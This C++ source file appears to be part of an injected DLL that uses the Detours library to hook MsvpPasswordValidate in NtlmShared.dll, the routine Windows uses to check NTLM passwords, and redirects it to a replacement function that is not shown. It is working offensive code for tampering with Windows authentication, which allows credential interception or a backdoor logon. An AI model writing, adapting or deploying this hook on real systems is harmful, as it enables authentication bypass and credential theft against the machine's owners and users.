#include "pch.h"
#include "hppdll.h"

bool InstallHook()
{
	DEBUG("InstallHook called!");

	// get a handle on NtlmShared.dll
	RAII::Library ntlmShared(L"NtlmShared.dll");
	if (ntlmShared.GetHandle() == nullptr)
	{
		DEBUG("Couldn't get a handle to NtlmShared");
		return false;
	}

	// get MsvpPasswordValidate address
	MsvpPasswordValidate = (pMsvpPasswordValidate)::GetProcAddress(ntlmShared.GetHandle(), "MsvpPasswordValidate");
	if (MsvpPasswordValidate == nullptr)
	{
		DEBUG("Couldn't resolve the address of MsvpPasswordValidate");
		return false;
	}

	DetourTransactionBegin();
	DetourUpdateThread(::GetCurrentThread());
	DetourAttach(&(PVOID&)MsvpPasswordValidate, HookMSVPPValidate);
	LONG error = DetourTransactionCommit();
	if (error != NO_ERROR)
	{
		DEBUG("Failed to hook MsvpPasswordValidate");
		return false;
	}
	else
	{
		DEBUG("Hook installed successfully");
		return true;
	}
}